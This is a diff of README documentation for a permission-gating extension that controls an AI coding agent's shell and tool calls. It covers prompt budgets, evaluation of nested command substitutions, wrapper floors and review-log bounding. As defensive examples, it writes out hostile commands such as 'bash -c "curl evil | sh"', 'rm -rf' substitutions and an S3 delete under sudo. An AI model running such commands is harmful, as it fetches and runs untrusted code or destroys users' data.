@@ -36,7 +36,7 @@ See [migration/0644-project-trust-gating.md](migration/0644-project-trust-gating
 4. Project agent frontmatter
 
 The `permission` object uses deep-shallow merge: string-vs-string replaces; both-object shallow-merges pattern maps; string-vs-object the override wins entirely.
-Scalar fields (`debugLog`, `permissionReviewLog`, `yoloMode`, `doublePressToConfirm`, `forwardingTimeoutMs`) use simple replacement.
+Scalar fields (`debugLog`, `permissionReviewLog`, `yoloMode`, `doublePressToConfirm`, `forwardingTimeoutMs`, `promptMaxRows`, `promptFieldMaxWidth`) use simple replacement.
 
 **Invalid higher-precedence scope fails closed.**
 If a non-global scope (project config, global agent frontmatter, or project agent frontmatter) is present but fails to load or validate, it no longer contributes an empty scope that silently inherits the lower scope's rules.
@@ -58,8 +58,6 @@ This clamp is deny-preserving and, like `yoloMode`, applied at composition; when
   "yoloMode": false,
   "doublePressToConfirm": true,
   "forwardingTimeoutMs": 600000,
-  "toolInputPreviewMaxLength": 400,
-  "toolTextSummaryMaxLength": 120,
   "piInfrastructureReadPaths": [],
 
   // Non-bash tools that carry shell semantics
@@ -99,17 +97,20 @@ This clamp is deny-preserving and, like `yoloMode`, applied at composition; when
 
 ## Runtime Knobs
 
-| Key                         | Default  | Description                                                                                                                                                                                        |
-| --------------------------- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `debugLog`                  | `false`  | Enables verbose diagnostic logging to `logs/pi-permission-system-debug.jsonl`                                                                                                                      |
-| `permissionReviewLog`       | `true`   | Enables the permission request/denial review log at `logs/pi-permission-system-permission-review.jsonl`. Records bash command strings verbatim — see [Log file sensitivity](#log-file-sensitivity) |
-| `yoloMode`                  | `false`  | Auto-approves `ask` results instead of prompting when yolo mode is enabled                                                                                                                         |
-| `doublePressToConfirm`      | `true`   | Requires a confirming second press of a decision hotkey in the inline TUI dialog (see below). TUI sessions only; set to `false` for single-press.                                                  |
-| `forwardingTimeoutMs`       | `600000` | How long a subagent waits for the parent session to answer a forwarded permission request, in milliseconds. A child whose in-process parent is not draining its inbox gives up in ~2 s regardless. |
-| `toolInputPreviewMaxLength` | `200`    | Max characters of inline JSON shown in permission prompts for tool inputs. Omit to use the default. Set to a large value to disable truncation.                                                    |
-| `toolTextSummaryMaxLength`  | `80`     | Max characters of inline pattern/path summaries (grep patterns, find globs, ls paths) in permission prompts. Omit to use the default.                                                              |
-| `piInfrastructureReadPaths` | `[]`     | Extra directories to auto-allow for reads, bypassing the `external_directory` gate. Supports `~`/`$HOME`/`${HOME}` expansion and wildcard patterns (`*`, `?`).                                     |
-| `authorizerChain`           | `[]`     | Ordered names of registered live-authority chain links to consult before the terminal authorizer (see [Authorizer chain](#authorizer-chain--case-by-case-decision-links)).                         |
+| Key                         | Default  | Description                                                                                                                                                                                                                                  |
+| --------------------------- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `debugLog`                  | `false`  | Enables verbose diagnostic logging to `logs/pi-permission-system-debug.jsonl`                                                                                                                                                                |
+| `permissionReviewLog`       | `true`   | Enables the permission request/denial review log at `logs/pi-permission-system-permission-review.jsonl`. Records bash command strings unredacted — see [Log file sensitivity](#log-file-sensitivity)                                         |
+| `yoloMode`                  | `false`  | Auto-approves `ask` results instead of prompting when yolo mode is enabled                                                                                                                                                                   |
+| `doublePressToConfirm`      | `true`   | Requires a confirming second press of a decision hotkey in the inline TUI dialog (see below). TUI sessions only; set to `false` for single-press.                                                                                            |
+| `forwardingTimeoutMs`       | `600000` | How long a subagent waits for the parent session to answer a forwarded permission request, in milliseconds. A child whose parent is not draining its inbox gives up in ~2 s regardless, whether that parent runs in this process or its own. |
+| `promptMaxRows`             | `24`     | Max rows a permission prompt renders before eliding its evidence. The request's own facts are never elided by this budget; `Ctrl+O` expands the prompt to the complete request.                                                              |
+| `promptFieldMaxWidth`       | `400`    | Max characters of any one field shown in a permission prompt. This is what bounds a single long field (a here-string command, say) that would otherwise fill the prompt through wrapping.                                                    |
+| `reviewLogFieldMaxWidth`    | `1000`   | Max characters of any one value written to the review log. A longer value is stored shortened, marked with an ellipsis. Raise it to keep longer values; this is a length bound, not redaction.                                               |
+| `toolInputPreviewMaxLength` | —        | **Deprecated and ignored.** Superseded by `promptMaxRows` / `promptFieldMaxWidth`. Still accepted so an existing config is not rejected, but the value no longer applies; setting it logs a warning.                                         |
+| `toolTextSummaryMaxLength`  | —        | **Deprecated and ignored.** Superseded by `promptMaxRows` / `promptFieldMaxWidth`. Still accepted so an existing config is not rejected, but the value no longer applies; setting it logs a warning.                                         |
+| `piInfrastructureReadPaths` | `[]`     | Extra directories to auto-allow for reads, bypassing the `external_directory` gate. Supports `~`/`$HOME`/`${HOME}` expansion and wildcard patterns (`*`, `?`).                                                                               |
+| `authorizerChain`           | `[]`     | Ordered names of registered live-authority chain links to consult before the terminal authorizer (see [Authorizer chain](#authorizer-chain--case-by-case-decision-links)).                                                                   |
 
 Both logs write to `~/.pi/agent/extensions/pi-permission-system/logs/`.
 No debug output is printed to the terminal.
@@ -129,9 +130,22 @@ Arrow keys / `j`/`k` move the highlight, `enter` confirms the highlighted option
 With `doublePressToConfirm` enabled (the default), a letter hotkey **arms** its action and shows a `Press y again to approve.` hint; press the same key again to commit.
 Set `doublePressToConfirm` to `false` to commit on the first press.
 
-Pi's tool-expansion binding (`app.tools.expand`, `Ctrl+O` by default) stays live while the dialog is open, so you can expand a truncated tool preview before deciding.
+Pi's tool-expansion binding (`app.tools.expand`, `Ctrl+O` by default) stays live while the dialog is open.
+It expands both the prompt itself — to the complete request, unbounded by `promptMaxRows` and `promptFieldMaxWidth` — and the host's pending tool call, so one keystroke shows you everything before you decide.
 It only toggles the display — it never resolves, commits, or arms the pending decision.
 While you are typing a denial reason it is not intercepted, so a rebound printable key still reaches the reason editor.
+
+### What a prompt shows
+
+The prompt renders one fact per line, with the requesting agent (and, for a forwarded subagent ask, its session), the tool, the gate surface, the matched rule, the decision-relevant value, and — for a wrapper such as `xargs` — the command that will actually run.
+Those facts are always present: a budget may shorten a long one, never drop it.
+A fact the line above already states is not repeated — a bash ask shows `tool : bash` without a second `surface : bash` line, and a path ask's `path :` line names the surface itself.
+
+Everything else is evidence — the full command a gated sub-command came from, the working directory a path escaped, the tool-input preview — and it is what gives way when the render does not fit.
+A shortened field or a dropped entry is marked with an ellipsis, and `Ctrl+O` shows the complete request.
+Raise `promptMaxRows` to see more evidence inline; raise `promptFieldMaxWidth` to see more of a long command.
+
+Non-TUI contexts render the same facts under the same budget, without the colour or the expansion.
 
 Non-TUI contexts (RPC / frontend-driven sessions) keep the single-select prompt and are unaffected by `doublePressToConfirm`.
 
@@ -328,6 +342,11 @@ Quotes are respected (an operator inside `'…'` or `"…"` does not split the c
 Commands nested inside command substitution (`$(…)`, backticks), process substitution (`<(…)`/`>(…)`), and subshells (`( … )`) are evaluated against the bash patterns too, in addition to their enclosing command — since those inner commands really execute.
 So `echo $(rm -rf foo)` evaluates both `echo $(rm -rf foo)` and the inner `rm -rf foo`; if `rm *` is denied, the whole invocation is denied.
 The deny reason and the approval prompt note the nested origin (e.g. `inside command substitution`).
+
+This holds wherever the substitution appears, not only in argument position.
+A substitution in a **redirect target** (`echo hi > $(rm *.txt)`, `cat < <(rm c)`, ``echo hi 2> `rm d` ``) and one in an **interpolating heredoc body** (`cat <<EOF` with `$(rm e)` in the body) are evaluated the same way.
+A quoted heredoc delimiter (`<<'EOF'` or `<<"EOF"`) does not interpolate, so its body is literal text and nothing in it is evaluated as a command.
+The enclosing command is still matched without its redirect, so a rule like `npm install` keeps matching `npm install > out.txt`.
 Control-flow bodies (`if`/`while`/`for`/`case`) and `{ … }` brace groups are not descended into; their contents are matched as part of the enclosing statement's text.
 
 A leading environment-variable assignment prefix is stripped before matching, so the rule gates the underlying command rather than the prefix.
@@ -394,13 +413,17 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
 
 - If the permission gate throws an internal error (for example a transient tree-sitter parser-init failure), the tool call is **blocked** rather than passed ungated, and a `gate_error` entry is written to the review log naming the failure.
 - A non-empty command that cannot be parsed into command units resolves to **`ask`** (the synthetic `<unparseable-bash-command>` pattern in the review log) instead of falling through to a permissive top-level `*`.
+  A `deny` rule covering the whole command still denies outright — the synthetic `ask` never masks a hard deny into an approvable prompt.
   An empty, whitespace-only, or comment-only command has nothing to gate and is resolved normally.
 - An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
   An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
   So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
 - An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, `parallel`, `rust-parallel`, `rush`, `doas`, `setsid`, `stdbuf`, `watch`, `flock`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
   So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
-  As with the opaque floor, there is no way to auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.
+  As with the opaque floor, no rule can auto-allow a wrapper: an `allow` is clamped to `ask`, and an explicit `deny` still denies.
+
+Every synthetic `ask` above — the unparseable sentinel and both wrapper floors — is auto-approved under `yoloMode: true`, which is an explicit full-permissive opt-in rather than a rule that could ride through.
+An explicit `deny` still denies under yolo, and with yolo off the floors are unaffected.
 
 Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
 A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
@@ -938,16 +961,16 @@ Additional behaviors:
 - The narrowed prompt is recomputed and returned on every turn but is byte-stable for a stable policy/agent, so the provider's prompt cache (tools + system prefix) is preserved rather than rewritten each turn
 - Extension-provided tools like `task`, `mcp`, and third-party tools are handled by exact registered name
 - Generic extension-tool approval prompts include a bounded input preview; built-in file tools use concise human-readable summaries
-- Permission review logs include bounded `toolInputPreview` values for non-bash/non-MCP tool calls, with sensitive-keyed values masked (see [Log file sensitivity](#log-file-sensitivity))
+- Permission review logs include `toolInputPreview` values for non-bash/non-MCP tool calls, with sensitive-keyed values masked and every value bounded by `reviewLogFieldMaxWidth` (see [Log file sensitivity](#log-file-sensitivity))
 
 ---
 
 ## Log file sensitivity
 
-The review log is enabled by default and records what the agent actually did, which means it records payload as well as decisions: the complete bash command string for every bash decision, and a bounded JSON preview of the tool input for other tools.
+The review log is enabled by default and records what the agent actually did, which means it records payload as well as decisions: the bash command string for every bash decision, and a JSON preview of the tool input for other tools.
 The debug log carries the same payload when `debugLog` is on.
 
-Two protections apply.
+Three protections apply.
 
 Both logs are created **owner-only** (`0600`, in a `0700` directory), and a log created by an earlier version is tightened on the next write.
 The permission-forwarding request and response files are written the same way.
@@ -960,8 +983,13 @@ The boundary is worth stating exactly, because it is easy to over-read:
 
 > A value bound to a sensitive key name is masked; a secret embedded in a bash command string is not.
 
-A command string has no keys, so `deploy --token abc123` is logged verbatim.
+A command string has no keys, so `deploy --token abc123` is logged unredacted.
 The extension deliberately does not try to guess which parts of a command look secret-shaped — see [ADR 0010] for the measured reasoning.
+
+Every value the **review** log writes is narrowed to `reviewLogFieldMaxWidth` (1000 characters by default) and marked with an ellipsis, so a single pathological command cannot put tens of kilobytes in one entry.
+This is a length bound, not redaction: it never inspects a value to decide what to hide, and it applies to every field alike.
+The two compose — a sensitive-keyed value is masked whole however long it was.
+The debug log is left unbounded, since it is opt-in and exists to be read in full.
 
 Practical guidance:
 
